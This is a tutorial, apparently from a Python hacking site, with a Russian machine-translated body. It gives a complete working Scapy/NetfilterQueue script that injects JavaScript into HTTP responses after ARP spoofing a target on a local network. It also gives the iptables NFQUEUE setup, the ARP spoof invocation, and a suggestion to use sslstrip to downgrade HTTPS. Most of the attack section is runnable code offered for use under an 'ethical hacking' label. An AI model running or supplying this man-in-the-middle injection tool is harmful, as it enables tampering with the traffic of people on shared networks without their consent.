# [How to Inject Code into HTTP Responses in the Network in Python](https://www.thepythoncode.com/article/injecting-code-to-html-in-a-network-scapy-python)
To run this:
- `pip3 install -r requirements.txt`
- Make sure you enabled IP forwarding, if you're using [this Python script](https://www.thepythoncode.com/code/building-arp-spoofer-using-scapy), then it'll automatically enable it.
- Start ARP Spoofing against the target using any tool such as [this Python script](https://www.thepythoncode.com/code/building-arp-spoofer-using-scapy) or arpspoof tool on Kali Linux.
- Add a new nfqueue FORWARD rule on `iptables`:
    ```bash
    $ iptables -I FORWARD -j NFQUEUE --queue-num 0
    ```

When you're done, make sure you CTRL+C the ARP spoof script, disable IP forwarding and flushing the iptables:
    ```bash
    $ iptables --flush
    ```
##
# [[] / []]()
После выполнения ARP-спуфинга на целевом компьютере в сети можно выполнять множество типов атак. Как вы, возможно, уже знаете, когда вы ARP подделываете цель в сети, вы будете человеком посередине, что означает, что каждый передаваемый пакет виден и может быть изменен злоумышленником.

В этом учебнике вы узнаете, как внедрить код Javascript (или даже HTML и CSS) в HTTP-пакеты в сети с помощью библиотеки Scapy на Python.

Scapy - это инструмент управления пакетами для компьютерных сетей, написанный на Python. Он работает на Linux и предоставляет нам возможность легко перехватывать, читать и изменять пакеты.

Чтобы иметь возможность изменять пакеты на лету, вы должны:

Имея машину Linux, Kali Linux является плюсом.
Будучи человеком посередине, подделывая цель ARP, учебник по подделке ARP даст вам более подробную информацию о том, как это делается, и мы просто запустим сценарий в этом уроке.
Добавление нового правила NFQUEUE FORWARD для команды iptables.
Запустите скрипт Python из этого учебника.
Получите: Создайте 24 этических хакерских скрипта и инструмента с помощью Python Book

Во-первых, давайте установим необходимые библиотеки для этого учебника:

$ pip install scapy==2.4.5 netfilterqueue colorama
Если вы изо всех сил пытаетесь установить Scapy на Debian/Ubuntu, проверьте этот учебник.

NetfilterQueue предоставляет доступ к пакетам, соответствующим правилу iptables в Linux. Таким образом, пакеты могут быть изменены, отброшены, приняты или переупорядочены.

Мы будем использовать colorama для цветной печати.

Во-первых, давайте импортируем наши библиотеки и инициализируем цвета:

from scapy.all import *
from colorama import init, Fore
import netfilterqueue
import re

# initialize colorama
init()

# define colors
GREEN = Fore.GREEN
RESET = Fore.RESET
Далее, чтобы привязаться к NetfilterQueue, мы должны сделать функцию, которая принимает пакет в качестве параметра, и мы сделаем модификацию пакета там. Функция будет длинной и поэтому разделена на две части:

def process_packet(packet):
    """
    This function is executed whenever a packet is sniffed
    """
    # convert the netfilterqueue packet into Scapy packet
    spacket = IP(packet.get_payload())
    if spacket.haslayer(Raw) and spacket.haslayer(TCP):
        if spacket[TCP].dport == 80:
            # HTTP request
            print(f"[*] Detected HTTP Request from {spacket[IP].src} to {spacket[IP].dst}")
            try:
                load = spacket[Raw].load.decode()
            except Exception as e:
                # raw data cannot be decoded, apparently not HTML
                # forward the packet exit the function
                packet.accept()
                return
            # remove Accept-Encoding header from the HTTP request
            new_load = re.sub(r"Accept-Encoding:.*\r\n", "", load)
            # set the new data
            spacket[Raw].load = new_load
            # set IP length header, checksums of IP and TCP to None
            # so Scapy will re-calculate them automatically
            spacket[IP].len = None
            spacket[IP].chksum = None
            spacket[TCP].chksum = None
            # set the modified Scapy packet back to the netfilterqueue packet
            packet.set_payload(bytes(spacket))
Скачать: Постройте 24 этических хакерских скрипта и инструментов с помощью Python Book

Это только половина функции:

Мы преобразуем наш пакет Netfilterqueue в пакет Scapy, обертывая packet.get_payload() пакетом IP().
Если пакет является необработанным слоем (каким-то видом данных) имеет уровень TCP, а порт назначения равен 80, то это определенно HTTP-запрос.
В HTTP-запросе мы ищем заголовок Accept-Encoding, если он доступен, то мы просто удаляем его, чтобы мы могли получить HTTP-ответы в виде необработанного HTML-кода, а не какого-то сжатия, такого как gzip.
Мы также устанавливаем длину IP-пакета, контрольные суммы уровней TCP и IP в Значение None, поэтому Scapy автоматически пересчитает их.
Далее, вот другая часть обнаружения HTTP-ответов:

        if spacket[TCP].sport == 80:
            # HTTP response
            print(f"[*] Detected HTTP Response from {spacket[IP].src} to {spacket[IP].dst}")
            try:
                load = spacket[Raw].load.decode()
            except:
                packet.accept()
                return
            # if you want to debug and see the HTML data
            # print("Load:", load)
            # Javascript code to add, feel free to add any Javascript code
            added_text = "<script>alert('Javascript Injected successfully!');</script>"
            # or you can add HTML as well!
            # added_text = "<p><b>HTML Injected successfully!</b></p>"
            # calculate the length in bytes, each character corresponds to a byte
            added_text_length = len(added_text)
            # replace the </body> tag with the added text plus </body>
            load = load.replace("</body>", added_text + "</body>")
            if "Content-Length" in load:
                # if Content-Length header is available
                # get the old Content-Length value
                content_length = int(re.search(r"Content-Length: (\d+)\r\n", load).group(1))
                # re-calculate the content length by adding the length of the injected code
                new_content_length = content_length + added_text_length
                # replace the new content length to the header
                load = re.sub(r"Content-Length:.*\r\n", f"Content-Length: {new_content_length}\r\n", load)
                # print a message if injected
                if added_text in load:
                    print(f"{GREEN}[+] Successfully injected code to {spacket[IP].dst}{RESET}")
            # if you want to debug and see the modified HTML data
            # print("Load:", load)
            # set the new data
            spacket[Raw].load = load
            # set IP length header, checksums of IP and TCP to None
            # so Scapy will re-calculate them automatically
            spacket[IP].len = None
            spacket[IP].chksum = None
            spacket[TCP].chksum = None
            # set the modified Scapy packet back to the netfilterqueue packet
            packet.set_payload(bytes(spacket))
    # accept all the packets
    packet.accept()
Теперь, если исходный порт равен 80, то это HTTP-ответ, и именно здесь мы должны изменить наш пакет:

Во-первых, мы извлекаем наше HTML-содержимое из HTTP-ответа из атрибута load пакета.
Во-вторых, поскольку каждый HTML-код имеет влагающий тег body (</body>), то мы можем просто заменить его внедренным кодом (например, JS) и добавить </body> обратно в конце.
После того, как переменная load изменена, нам нужно пересчитать заголовок Content-Length, который отправляется на HTTP-ответ, мы добавляем длину внедренного кода к исходной длине и устанавливаем ее обратно с помощью функции re.sub(). Если текст находится в загрузке, мы печатаем зеленое сообщение, указывающее, что мы успешно изменили HTML-код HTTP-ответа.
Кроме того, мы установили нагрузку обратно и убрали длину и контрольную сумму, как и раньше, поэтому Scapy пересчитает их.
Наконец, мы устанавливаем модифицированный пакет Scapy в пакет NetfilterQueue и принимаем все пересылаемые пакеты.
Теперь наша функция готова, запустим очередь:

if __name__ == "__main__":
    # initialize the queue
    queue = netfilterqueue.NetfilterQueue()
    # bind the queue number 0 to the process_packet() function
    queue.bind(0, process_packet)
    # start the filter queue
    queue.run()
После создания экземпляра NetfilterQueue()мы привязываем нашу ранее определенную функцию к номеру очереди 0, а затем запускаем очередь.

Пожалуйста, сохраните файл как http_code_injector.py, и давайте начнем атаку.

ARP Спуфинг целевого объекта
Для начала работы необходимо иметь два компьютера, подключенных к одной сети. Целевая машина может быть на любой ОС. Однако компьютер злоумышленника должен быть подключен к Linux. В противном случае это не сработает.

После того, как у вас есть IP-адрес целевой машины, а также IP-адрес шлюза (маршрутизатора или точки доступа), возьмите этот сценарий ARP Spoofing Python и запустите его на компьютере злоумышленника:

$ python3 arp_spoof.py 192.168.43.112 192.168.43.1
В моем случае 192.168.43.112 — это IP-адрес целевой машины, а IP-адрес шлюза — 192.168.43.1; Вот как будет выглядеть вывод:

[!] Enabling IP Routing...
[!] IP Routing enabled.
Это включало IP-пересылку, которая необходима для пересылки пакетов на компьютере злоумышленника. Если вы хотите видеть ARP-пакеты, отправленные этим скриптом, просто передайте параметр -v или --verbose.

Связанные с: Создание 24 этических хакерских скриптов и инструментов с помощью Python Book

Правило добавления IPTables
Теперь, когда вы являетесь человеком посередине, продолжайте и добавьте правило FORWARD для iptables:

$ iptables -I FORWARD -j NFQUEUE --queue-num 0
После выполнения этой команды вы заметите, что целевая машина потеряет подключение к Интернету, и это потому, что пакеты застряли на машине злоумышленника, и нам нужно запустить наш сценарий, чтобы вернуть его снова.

Внедрение кода в HTTP-пакеты
Теперь мы просто запускаем код Python из этого учебника:

$ python http_code_injector.py
Теперь перейдите на целевой компьютер и просмотрите любой веб-сайт HTTP, такой как ptsv2.com или http://httpbin.org, и вы увидите что-то вроде этого на компьютере злоумышленника:

Внедрение кода выполнено успешноВ браузере на целевом компьютере вы увидите предупреждение, которое мы ввели:

Появилось оповещение JS

Вы также увидите внедренный код, если просмотрите исходный код страницы:

Код, внедренный в исходный код страницыЗаключение
Замечательно! Теперь вы не ограничены этим! Вы можете внедрить HTML, CSS, заменить заголовок, заменить стили, заменить изображения и многое другое; предел – это ваше воображение.

Когда вы закончите атаку, убедитесь, что вы ввели CTRL + C сценарий подделки ARP и выполнили команду iptables --flush, чтобы вернуть все в нормальное русло.

Для получения более подробной информации о спуфинге ARP, ознакомьтесь с нашим руководством по этому вопросу.

Обратите внимание, что код будет работать только на HTTP-сайтах. Если вы хотите, чтобы он работал на HTTPS, рассмотрите возможность использования таких инструментов, как sslstrip, чтобы понизить целевую машину с HTTPS до HTTP.

Наконец, у нас есть электронная книга Ethical Hacking with Python, где мы создаем 24 хакерских инструмента и скрипта с нуля с помощью Python! Обязательно проверьте это здесь, если вы заинтересованы.

Обратите внимание, что мы не несем никакой ответственности за ущерб, который вы наносите коду, используете его на своем компьютере или запрашиваете разрешение на его тестирование в целях обучения.